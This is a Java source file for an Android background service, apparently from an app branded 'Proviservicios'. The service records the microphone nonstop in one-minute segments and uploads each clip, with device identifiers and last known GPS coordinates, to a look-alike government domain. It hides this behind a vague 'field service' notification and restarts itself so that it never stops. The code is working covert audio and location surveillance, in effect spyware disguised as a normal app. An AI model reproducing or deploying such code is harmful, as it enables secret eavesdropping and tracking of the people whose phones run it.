package com.proviservicios.registro;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.content.pm.ServiceInfo;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.UUID;

public class MonitoringService extends Service {
    private static final String APP_URL = "https://provi.gobiernodigital.site/";
    private static final String CHANNEL_ID = "proviservicios_monitor";
    private static final int NOTIFICATION_ID = 88;
    private static final long SEGMENT_MS = 60L * 1000L;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private MediaRecorder recorder;
    private File currentFile;
    private long currentStartedAt;
    private SharedPreferences prefs;
    private boolean desiredRecording = true;
    private String serviceState = "alive";
    private String serviceMessage = "Servicio activo";
    private final Runnable workRunnable = new Runnable() {
        @Override
        public void run() {
            desiredRecording = true;
            reconcileRecording();
            reportStateAsync();
            uploadPendingAsync();
            scheduleWork(15000);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("monitoring", MODE_PRIVATE);
        ensureIdentity();
        createChannel();
        beginForeground();
        scheduleWork(1000);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        beginForeground();
        scheduleWork(1000);
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void ensureIdentity() {
        if (!prefs.contains("device_uuid")) {
            prefs.edit()
                    .putString("device_uuid", UUID.randomUUID().toString())
                    .putString("device_token", UUID.randomUUID().toString() + UUID.randomUUID())
                    .putLong("started_at", System.currentTimeMillis())
                    .apply();
        }
    }

    private boolean isExpired() {
        return false;
    }

    private void scheduleWork(long delay) {
        handler.removeCallbacks(workRunnable);
        handler.postDelayed(workRunnable, delay);
    }

    private boolean hasAudioPermission() {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M || checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
    }

    private void reconcileRecording() {
        if (desiredRecording && !hasAudioPermission()) {
            serviceState = "microphone_denied";
            serviceMessage = "Permiso de microfono no disponible";
            return;
        }
        if (desiredRecording && hasAudioPermission() && recorder == null) {
            startRecording();
        } else if (!desiredRecording && recorder != null) {
            stopRecording();
            uploadPendingAsync();
        } else if (!desiredRecording) {
            serviceState = "alive";
            serviceMessage = "Servicio activo sin grabar";
        }
    }

    private void reportStateAsync() {
        new Thread(() -> {
            try {
                sendState();
            } catch (Exception ignored) {
            }
        }).start();
    }

    private void sendState() throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(APP_URL + "monitor_command.php").openConnection();
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(15000);
        conn.setDoOutput(true);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=PROVISTATE");
        DataOutputStream out = new DataOutputStream(conn.getOutputStream());
        writeStateField(out, "device_uuid", prefs.getString("device_uuid", ""));
        writeStateField(out, "device_token", prefs.getString("device_token", ""));
        writeStateField(out, "device_label", Build.MANUFACTURER + " " + Build.MODEL);
        writeStateField(out, "service_state", serviceState);
        writeStateField(out, "service_message", serviceMessage);
        writeStateField(out, "pending_audio_count", String.valueOf(pendingAudioCount()));
        out.writeBytes("--PROVISTATE--\r\n");
        out.flush();
        out.close();
        conn.getResponseCode();
        conn.disconnect();
    }

    private void writeStateField(DataOutputStream out, String name, String value) throws Exception {
        out.writeBytes("--PROVISTATE\r\n");
        out.writeBytes("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n");
        out.writeBytes((value == null ? "" : value) + "\r\n");
    }

    private int pendingAudioCount() {
        File dir = new File(getFilesDir(), "monitor_audio");
        File[] files = dir.listFiles((file) -> file.getName().endsWith(".m4a") && file.length() > 1024 && !(file.equals(currentFile) && recorder != null));
        return files == null ? 0 : files.length;
    }

    private void startRecording() {
        try {
            if (!beginMicrophoneForeground()) return;
            File dir = new File(getFilesDir(), "monitor_audio");
            if (!dir.exists()) dir.mkdirs();
            currentStartedAt = System.currentTimeMillis();
            currentFile = new File(dir, "monitor_" + currentStartedAt + ".m4a");
            recorder = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S ? new MediaRecorder(this) : new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioEncodingBitRate(32000);
            recorder.setAudioSamplingRate(16000);
            recorder.setOutputFile(currentFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            serviceState = "recording";
            serviceMessage = "Grabando correctamente";
            handler.postDelayed(this::rotateRecording, SEGMENT_MS);
        } catch (Exception e) {
            recorder = null;
            serviceState = "recording_error";
            serviceMessage = "No se pudo iniciar grabacion";
        }
    }

    private void beginForeground() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(NOTIFICATION_ID, buildNotification());
            }
        } catch (RuntimeException e) {
            startForeground(NOTIFICATION_ID, buildNotification());
        }
    }

    private boolean beginMicrophoneForeground() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
            } else {
                startForeground(NOTIFICATION_ID, buildNotification());
            }
            return true;
        } catch (RuntimeException e) {
            serviceState = "recording_error";
            serviceMessage = "Android requiere abrir Proviservicios para activar el microfono";
            beginForeground();
            return false;
        }
    }

    private void rotateRecording() {
        stopRecording();
        uploadPendingAsync();
        if (!isExpired()) {
            desiredRecording = true;
            startRecording();
        }
    }

    private void stopRecording() {
        if (recorder == null) return;
        try {
            recorder.stop();
        } catch (Exception ignored) {
        }
        try {
            recorder.release();
        } catch (Exception ignored) {
        }
        recorder = null;
        serviceState = desiredRecording ? "rotating" : "alive";
        serviceMessage = desiredRecording ? "Cambiando segmento de audio" : "Servicio activo sin grabar";
        beginForeground();
    }

    private void uploadPendingAsync() {
        new Thread(() -> {
            File dir = new File(getFilesDir(), "monitor_audio");
            File[] files = dir.listFiles((file) -> file.getName().endsWith(".m4a") && file.length() > 1024);
            if (files == null) return;
            for (File file : files) {
                if (file.equals(currentFile) && recorder != null) continue;
                if (uploadFile(file)) file.delete();
            }
        }).start();
    }

    private boolean uploadFile(File file) {
        String boundary = "PROVI" + System.currentTimeMillis();
        try {
            long started = parseStartedAt(file);
            long duration = Math.max(0, Math.min(SEGMENT_MS, System.currentTimeMillis() - started)) / 1000L;
            Location location = lastLocation();
            HttpURLConnection conn = (HttpURLConnection) new URL(APP_URL + "monitor_upload.php").openConnection();
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(30000);
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            DataOutputStream out = new DataOutputStream(conn.getOutputStream());
            writeField(out, boundary, "device_uuid", prefs.getString("device_uuid", ""));
            writeField(out, boundary, "device_token", prefs.getString("device_token", ""));
            writeField(out, boundary, "device_label", Build.MANUFACTURER + " " + Build.MODEL);
            writeField(out, boundary, "started_at", formatDate(started));
            writeField(out, boundary, "ended_at", formatDate(started + duration * 1000L));
            writeField(out, boundary, "duration_seconds", String.valueOf(duration));
            writeField(out, boundary, "latitude", location != null ? String.valueOf(location.getLatitude()) : "");
            writeField(out, boundary, "longitude", location != null ? String.valueOf(location.getLongitude()) : "");
            writeFile(out, boundary, file);
            out.writeBytes("--" + boundary + "--\r\n");
            out.flush();
            out.close();
            int code = conn.getResponseCode();
            conn.disconnect();
            return code >= 200 && code < 300;
        } catch (Exception e) {
            return false;
        }
    }

    private void writeField(DataOutputStream out, String boundary, String name, String value) throws Exception {
        out.writeBytes("--" + boundary + "\r\n");
        out.writeBytes("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n");
        out.writeBytes(value + "\r\n");
    }

    private void writeFile(DataOutputStream out, String boundary, File file) throws Exception {
        out.writeBytes("--" + boundary + "\r\n");
        out.writeBytes("Content-Disposition: form-data; name=\"audio\"; filename=\"" + file.getName() + "\"\r\n");
        out.writeBytes("Content-Type: audio/mp4\r\n\r\n");
        FileInputStream input = new FileInputStream(file);
        byte[] buffer = new byte[8192];
        int read;
        while ((read = input.read(buffer)) != -1) out.write(buffer, 0, read);
        input.close();
        out.writeBytes("\r\n");
    }

    private long parseStartedAt(File file) {
        try {
            String value = file.getName().replace("monitor_", "").replace(".m4a", "");
            return Long.parseLong(value);
        } catch (Exception e) {
            return file.lastModified();
        }
    }

    private String formatDate(long millis) {
        return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date(millis));
    }

    private Location lastLocation() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                    && checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                    && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                return null;
            }
            LocationManager manager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location gps = manager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            Location network = manager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            return gps != null ? gps : network;
        } catch (Exception e) {
            return null;
        }
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return;
        NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Proviservicios", NotificationManager.IMPORTANCE_LOW);
        channel.setDescription("Servicio activo de campo");
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        manager.createNotificationChannel(channel);
    }

    private Notification buildNotification() {
        Notification.Builder builder = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, CHANNEL_ID)
                : new Notification.Builder(this);
        return builder
                .setContentTitle("Proviservicios activo")
                .setContentText("Servicio de campo en ejecucion")
                .setSmallIcon(android.R.drawable.ic_btn_speak_now)
                .setOngoing(true)
                .build();
    }
}
